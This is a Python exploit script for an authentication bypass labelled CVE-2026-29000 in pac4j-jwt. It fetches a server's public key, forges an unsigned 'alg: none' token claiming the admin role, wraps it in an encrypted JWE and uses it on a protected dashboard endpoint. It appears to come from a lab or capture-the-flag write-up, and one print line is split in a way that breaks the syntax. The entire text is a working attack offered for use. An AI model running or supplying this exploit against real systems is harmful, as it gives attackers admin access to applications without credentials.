#!/usr/bin/env python3
"""CVE-2026-29000 - pac4j-jwt Authentication Bypass"""
import json
import time
import base64
import requests
from jwcrypto import jwk, jwe
import sys
TARGET = sys.argv[1]
# Step 1: Fetch the RSA public key from JWKS
print("[*] Fetching JWKS...")
resp = requests.get(f"{TARGET}/api/auth/jwks")
jwks_data = resp.json()
key_data = jwks_data['keys'][0]
pub_key = jwk.JWK(**key_data)
print(f"[+] Got RSA public key (kid: {key_data['kid']})")
# Step 2: Craft a PlainJWT with admin claims

#We can save this into a file called jwt.py and then we will pass the target URL and port as a
#parameter
def b64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

now = int(time.time())
header = b64url_encode(json.dumps({"alg": "none"}).encode())
payload = b64url_encode(json.dumps({
    "sub": "admin",
    "role": "ROLE_ADMIN",
    "iss": "principal-platform",
    "iat": now,
    "exp": now + 3600
}).encode())
plain_jwt = f"{header}.{payload}."
print(f"[*] Crafted PlainJWT with sub=admin, role=ROLE_ADMIN")
# Step 3: Wrap in JWE encrypted with server's RSA public key
jwe_token = jwe.JWE(
    plain_jwt.encode(),
    recipient=pub_key,
    protected=json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "kid": key_data['kid'],
        "cty": "JWT"
        })
)
forged_token = jwe_token.serialize(compact=True)
print(f"[+] Forged JWE token created")
# Step 4: Access protected endpoints
headers = {"Authorization": f"Bearer {forged_token}"}
print("\n[*] Accessing /api/dashboard...")
resp = requests.get(f"{TARGET}/api/dashboard", headers=headers)
print(f"[+] Status: {resp.status_code}")
data = resp.json()
print(f"[+] Authenticated as: {data['user']['username']} ({data['user']
['role']})")
print(f"[+] Token: {forged_token}")
